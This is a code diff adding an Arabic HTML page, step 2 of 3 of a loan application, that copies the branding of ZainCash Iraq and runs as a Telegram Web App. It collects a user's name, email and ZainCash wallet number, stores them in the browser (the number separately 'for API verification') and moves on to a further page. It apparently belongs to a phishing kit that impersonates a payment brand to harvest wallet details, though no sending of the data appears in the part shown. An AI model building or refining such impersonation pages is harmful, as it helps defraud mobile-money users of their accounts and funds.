@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>زين كاش العراق - طلب القرض (المعلومات الشخصية)</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --zc-purple: #6A1B9A;          /* ZainCash Signature Deep Purple */
+            --zc-magenta: #C2185B;         /* ZainCash Vibrant Magenta Accent */
+            --zc-gradient: linear-gradient(135deg, #4A148C 0%, #8E24AA 55%, #D81B60 100%);
+            --zc-dark: #1E102B;            /* Deep Plum Dark Text */
+            --zc-accent-purple: #7B1FA2;
+            --bg-color: #F7F5F9;
+            --card-bg: #FFFFFF;
+            --calc-bg: #F5EEF8;            /* Soft Lavender Tint */
+            --calc-border: #E1BEE7;
+            --text-main: #1E102B;
+            --text-muted: #6A5D75;
+            --input-border: #E0D7E8;
+            --input-focus: #8E24AA;
+            --btn-gray: #EDE7F6;
+            --btn-gray-text: #4A148C;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: 'Cairo', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            direction: rtl;
+        }
+
+        /* Top Header Navigation Bar - ZainCash Gradient */
+        .app-header {
+            width: 100%;
+            background: var(--zc-gradient);
+            height: 62px;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 3px 10px rgba(74, 20, 140, 0.25);
+        }
+
+        .back-btn-top {
+            color: #ffffff;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .header-title {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            align-items: center;
+            font-size: 20px;
+            font-weight: 900;
+            color: #ffffff;
+            gap: 6px;
+        }
+
+        .header-title .region {
+            color: #ffffff;
+            font-size: 11px;
+            font-weight: 700;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 2px 8px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .menu-icon {
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .menu-icon span {
+            display: block;
+            width: 22px;
+            height: 3px;
+            background-color: #ffffff;
+            border-radius: 2px;
+        }
+
+        /* Card Layout */
+        .card {
+            background: var(--card-bg);
+            width: 90%;
+            max-width: 440px;
+            margin: 20px 0 30px;
+            padding: 30px 22px;
+            border-radius: 20px;
+            box-shadow: 0 6px 25px rgba(106, 27, 154, 0.08);
+            border: 1px solid #EDE7F6;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-title {
+            font-size: 24px;
+            color: var(--text-main);
+            margin: 0 0 6px;
+            text-align: center;
+            font-weight: 800;
+        }
+
+        .subtext {
+            font-size: 13px;
+            color: var(--text-muted);
+            text-align: center;
+            margin-bottom: 22px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        /* Step Progress Bar */
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 0 auto 28px;
+            width: 100%;
+        }
+
+        .step-bar {
+            flex: 1;
+            height: 6px;
+            background-color: #E0D7E8;
+            border-radius: 3px;
+        }
+
+        .step-bar.active {
+            background: var(--zc-gradient);
+        }
+
+        /* Form Inputs */
+        .form-group {
+            margin-bottom: 18px;
+            display: flex;
+            flex-direction: column;
+            text-align: right;
+        }
+
+        .form-group label {
+            font-size: 14px;
+            font-weight: 800;
+            color: var(--zc-dark);
+            margin-bottom: 8px;
+        }
+
+        .form-control {
+            font-size: 15px;
+            padding: 14px 16px;
+            border: 2px solid var(--input-border);
+            border-radius: 12px;
+            background-color: #ffffff;
+            color: var(--text-main);
+            outline: none;
+            width: 100%;
+            transition: border-color 0.2s;
+            font-weight: 600;
+            direction: rtl;
+        }
+
+        .form-control::placeholder {
+            color: #A095A8;
+        }
+
+        .form-control:focus {
+            border-color: var(--zc-magenta);
+        }
+
+        /* Phone Input Group */
+        .phone-group {
+            display: flex;
+            gap: 10px;
+            direction: ltr;
+        }
+
+        .country-prefix {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            background-color: var(--calc-bg);
+            border: 2px solid var(--calc-border);
+            border-radius: 12px;
+            padding: 0 14px;
+            font-weight: 800;
+            font-size: 15px;
+            color: var(--zc-dark);
+            white-space: nowrap;
+        }
+
+        .flag-icon {
+            font-size: 18px;
+            line-height: 1;
+        }
+
+        .phone-input {
+            direction: ltr;
+            text-align: right;
+        }
+
+        .phone-hint {
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-top: 6px;
+            font-weight: 600;
+            text-align: right;
+        }
+
+        /* Buttons Container */
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 16px;
+        }
+
+        .btn-prev {
+            background-color: var(--btn-gray);
+            color: var(--btn-gray-text);
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: background-color 0.2s;
+        }
+
+        .btn-prev:hover {
+            background-color: #D1C4E9;
+        }
+
+        .btn-next {
+            background: var(--zc-gradient);
+            color: #ffffff;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: opacity 0.2s, transform 0.1s;
+            box-shadow: 0 4px 14px rgba(142, 36, 170, 0.35);
+        }
+
+        .btn-next:active {
+            opacity: 0.92;
+            transform: scale(0.99);
+        }
+
+        /* Footer */
+        .footer-banner {
+            width: 100%;
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-top: auto;
+            font-weight: 600;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- ZainCash Header Navigation Bar -->
+<div class="app-header">
+    <a onclick="goBack()" class="back-btn-top">← رجوع</a>
+    <div class="header-title">
+        <span>زين كاش</span><span class="region">العراق</span>
+    </div>
+    <div class="menu-icon">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+</div>
+
+<div class="card">
+    <h1 class="main-title">طلب القرض</h1>
+    <div class="subtext">الخطوة 2 من 3</div>
+
+    <!-- Step Bar Progress Indicators (Steps 1 & 2 Active) -->
+    <div class="step-indicator">
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar"></div>
+    </div>
+
+    <!-- Personal Info Form -->
+    <form id="step2Form" onsubmit="goNext(event)">
+        <div class="form-group">
+            <label for="firstName">الاسم الأول</label>
+            <input type="text" id="firstName" class="form-control" placeholder="علي" required>
+        </div>
+
+        <div class="form-group">
+            <label for="lastName">اسم العائلة</label>
+            <input type="text" id="lastName" class="form-control" placeholder="الشمري" required>
+        </div>
+
+        <div class="form-group">
+            <label for="email">البريد الإلكتروني</label>
+            <input type="email" id="email" class="form-control" placeholder="ali.alshammari@example.iq" required style="direction: ltr; text-align: right;">
+        </div>
+
+        <div class="form-group">
+            <label for="phone">رقم محفظة زين كاش</label>
+            <div class="phone-group">
+                <div class="country-prefix">
+                    <span class="flag-icon">🇮🇶</span>
+                    <span>+964</span>
+                </div>
+                <input type="tel" id="phone" class="form-control phone-input" placeholder="7812345678" maxlength="10" pattern="[0-9]{10}" required>
+            </div>
+            <div class="phone-hint">10 أرقام (مثال: 7812345678)</div>
+        </div>
+
+        <div class="btn-container">
+            <button type="button" class="btn-prev" onclick="goBack()">السابق</button>
+            <button type="submit" class="btn-next">التالي</button>
+        </div>
+    </form>
+</div>
+
+<!-- Footer -->
+<div class="footer-banner">
+    © 2026 زين كاش العراق (ZainCash Iraq) - جميع الحقوق محفوظة
+</div>
+
+<script>
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        // Auto-fill existing saved user info
+        const fName = localStorage.getItem('firstName');
+        const lName = localStorage.getItem('lastName');
+        const email = localStorage.getItem('email');
+        const phone = localStorage.getItem('phone');
+
+        if (fName) document.getElementById('firstName').value = fName;
+        if (lName) document.getElementById('lastName').value = lName;
+        if (email) document.getElementById('email').value = email;
+        if (phone) document.getElementById('phone').value = phone;
+    };
+
+    function goNext(event) {
+        event.preventDefault();
+
+        const fName = document.getElementById('firstName').value.trim();
+        const lName = document.getElementById('lastName').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+
+        if (!fName || !lName || !email || !phone) {
+            alert("يرجى ملء جميع الحقول المطلوبة.");
+            return;
+        }
+
+        if (!/^\d{10}$/.test(phone)) {
+            alert("يرجى إدخال رقم محفظة زين كاش صحيح يتكون من 10 أرقام.");
+            return;
+        }
+
+        // Save stored details
+        localStorage.setItem('firstName', fName);
+        localStorage.setItem('lastName', lName);
+        localStorage.setItem('email', email);
+        localStorage.setItem('phone', phone);
+        
+        // Save phone specifically for API verification
+        localStorage.setItem('userPhone', phone);
+
+        window.location.href = "/page4";
+    }
+
+    function goBack() {
+        window.location.href = "/page2";
+    }
+</script>
+
+</body>
+</html>
